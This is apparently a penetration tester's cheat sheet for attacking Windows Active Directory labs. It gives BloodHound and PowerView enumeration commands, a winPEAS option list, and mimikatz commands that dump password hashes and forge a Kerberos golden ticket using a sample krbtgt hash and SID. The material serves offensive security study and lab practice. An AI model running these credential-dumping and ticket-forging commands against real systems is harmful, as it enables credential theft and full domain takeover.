##### tools:
- bloodhound
- powerview
- mimikatz
- winpeas
### bloodhound
- copy sharphhoud.ps1/exe to the windows target machine
- upload the loot.zip file to sharphoud.
```powershell
# invoke bloodhoud 
Invoke-Bloodhound -CollectionMethod all
# specify domain and zipfile
Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip
# run from windows cmd connected to the domain via `runas` using some user credentials
Invoke-Bloodhound -c all -d BLACKFIELD.local --domaincontroller 10.10.10.191

```
### PowerView
- PowerView [cheat sheet](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)
```powershell
# Enumerate the domain users
Get-NetUser | select cn
# Enumerate the domain groups
Get-NetGroup GroupName *admin*
# Enumerate shared folders
Invoke-ShareFinder
# Enumerate Operating Systems on domain
Get-NetComputer -fulldata | select operatingsystem

```
### mimikatz
```powershell
# ensure privileges - ensure you are admin
privilege::debug
# dump users hashes 
lsadump::lsa /patch
## create goldent ticket
# dumps the hash and security identifier of the Kerberos TGT account
lsadump::lsa /inject /name:krbtgt
# create golden ticket
kerberos::golden /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf /user:newAdmin /id:500 /ptt
# 
misc::cmd
```




#### winpeas
```c
domain               Enumerate domain information
systeminfo           Search system information
userinfo             Search user information
processinfo          Search processes information
servicesinfo         Search services information
applicationsinfo     Search installed applications information
networkinfo          Search network information
windowscreds         Search windows credentials
browserinfo          Search browser information
filesinfo            Search generic files that can contains credentials
fileanalysis         Search specific files that can contains credentials and for regexes inside files
eventsinfo           Display interesting events information

quiet                Do not print banner
notcolor             Don't use ansi colors (all white)
searchpf             Search credentials via regex also in Program Files folders
wait                 Wait for user input between checks
debug                Display debugging information - memory usage, method execution time
log[=logfile]        Log all output to file defined as logfile, or to "out.txt" if not specified
MaxRegexFileSize=1000000        Max file size (in Bytes) to search regex in. Default: 1000000B
```